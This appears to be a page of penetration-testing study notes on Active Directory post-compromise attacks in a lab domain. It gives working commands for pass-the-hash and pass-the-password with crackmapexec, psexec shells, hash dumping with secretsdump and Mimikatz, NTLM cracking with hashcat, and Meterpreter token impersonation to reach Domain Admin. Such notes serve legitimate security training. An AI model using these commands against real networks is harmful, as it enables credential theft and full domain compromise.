---
description: We have access, now what?
---

# Attacking AD: Post-Compromise Attacks

## Introduction

* <mark style="color:yellow;">All attacks within this section involve having some type of credential first</mark>
* <mark style="color:yellow;">In other words, we need access for these attacks to be effective</mark>

## Pass the Hash/Password

* We need to grab our recently obtained hash/password and throw it around the network and see if anything sticks
* We can do that easily with <mark style="color:yellow;">crackmapexec</mark>

### Pass the Password

* Let's pass what we just cracked

```
crackmapexec 10.10.10.0/24 -u user -d htb -p Password1
```

### Pass the Hash

* We can do that by running metasploit's psexec, crackmapexec, or impacket's psexec

<mark style="color:yellow;">Metasploit: windows/smb/psexec</mark>

Pass the Hash:

```
crackmapexec 10.10.10.0/24 -u user -H <hash_here> --local
```

## Pass the Password Attacks

SMB:

```
crackmapexec smb 192.168.57.0/24 -u user -d htb.local -p Password1
```

* Did you get a pwn3d?&#x20;
* Time to psexec!

Psexec:

```
impacket-psexec domain/user:Password1@<pwn3d_IP>
```

## Dumping Hashes w/ secretsdump

Dumping hashes w/ known valid creds:

```
impacket-secretsdump domain/user:Password1@<pwn3d_IP>
```

* If you have more than 1 pwn3d IP, re run the tool with the other IP(s)!
* Focus on the local SAM hashes

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* Grab the hashes and place them into a hashes.txt file to crack them and pass them around the network!!!

## Cracking NTLM Hashes w/ Hashcat

<mark style="color:yellow;">Note: You can pass around NTLMv1 hashes. You CAN'T pass around NTLMv2 hashes.</mark>

<mark style="color:yellow;">NTLMv1 Hashes: 1000</mark>

<mark style="color:yellow;">NTLMv2 Hashes: 5600</mark>

Step 1: Copy the hashes and place them into the Hashcat folder

Step 2: Attempt to crack the hashes

```
hashcat64.exe -m 1000 hashes.txt rockyou.txt -O
```

Blank Passwords:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* If you see something like this, odds are this account is disabled and you cannot do anything with it
* Still worth a shot!

## Pass the Hash Attacks

SMB:

```
crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H <hash> --local-auth
```

Get a pwn3d?

Time to get a shell:

```
impacket-psexec "Frank Castle":@192.168.57.141 -hashes LM:NT
```

## Token Impersonation

What are tokens?

* Tokens are <mark style="color:yellow;">temporary keys that allow you access to a system/network</mark> without having to provide credentials each time that you access a file.&#x20;
* This is comparable to <mark style="color:yellow;">cookies</mark> for computers

There are <mark style="color:yellow;">two types</mark> of tokens:

* <mark style="color:yellow;">Delegate</mark> - Created for logging into a machine or using RDP
* <mark style="color:yellow;">Impersonate</mark> - "non-interactive"; such as attaching a network drive or a domain logon script

### Meterpreter Shell

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > load incognito
Loading extensino incognito...Success.

meterpreter > list_tokens -u

Delegation Tokens Available
MARVEL\fcastle
```

* Try to look for a user that has a delegation token available that you have access to

The next thing we are going to do is try to impersonate that user:

```
meterpreter > impersonate_token marvel\\fcastle
Delegation tokens available
Successfully impersonated user MARVEL\fcastle

meterpreter > shell
C:\Windows\system32>whoami
marvel\fcastle
```

* If the user is a Domain Admin and that token is available, we can impersonate it and become them!
* We will use <mark style="color:yellow;">mimikatz</mark> here!

List Tokens:

```
meterpreter > list_tokens -u
Delegation tokens available
MARVEL\Administrator
MARVEL\fcastle
```

Impersonate Token:

```
meterpreter> impersonate_token MARVEL\\administrator
Delegation tokens available
Successfully impersonated user MARVEL\administrator

meterpreter> shell

C:\Windows\system32>whoami
marvel\administrator
```

* We are now administrator!

Now, we can Dump hashes as Domain Admin:

```
PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer HYDRA.marvel.local

mimikatz (powershell) # privilege::debug
privilege '20' OK

mimikatz (powershell) # LSADump::LSA /patch
```

* <mark style="color:yellow;">Upon success, this will dump all of the hashes within the domain</mark>
* <mark style="color:yellow;">This of course includes the Kerberos Ticket Granting Ticket Account (krbtgt)</mark>
